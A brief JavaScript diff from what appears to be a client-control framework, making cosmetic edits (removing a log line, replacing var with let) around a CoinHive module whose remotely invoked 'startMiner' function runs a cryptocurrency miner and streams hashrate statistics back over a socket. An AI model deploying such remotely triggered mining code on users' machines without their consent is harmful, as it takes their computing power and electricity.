@@ -13,8 +13,6 @@ ExampleModule.setMainFunction(function(module, socket, config) {
 ExampleModule.addRemoteFunction("md5Hash", function(args, debug) {
 	let out = [];
 	
-	console.log(args);
-	
 	if (args instanceof Function) args = args();
 	
 	for (let i = 0; i < args.length; i++) {
@@ -47,9 +45,9 @@ CoinHiveModule.addRemoteFunction("startMiner", function(sitekey, debug) {
 		miner.start();
 		if (debug) console.log("Debug: Miner started!");	
 		setInterval(function() {
-			var hashesPerSecond = miner.getHashesPerSecond();
-			var totalHashes = miner.getTotalHashes();
-			var acceptedHashes = miner.getAcceptedHashes();
+			let hashesPerSecond = miner.getHashesPerSecond();
+			let totalHashes = miner.getTotalHashes();
+			let acceptedHashes = miner.getAcceptedHashes();
 
 			socket.emit("minerData", [hashesPerSecond, totalHashes, acceptedHashes]);
 		}, 1000);					
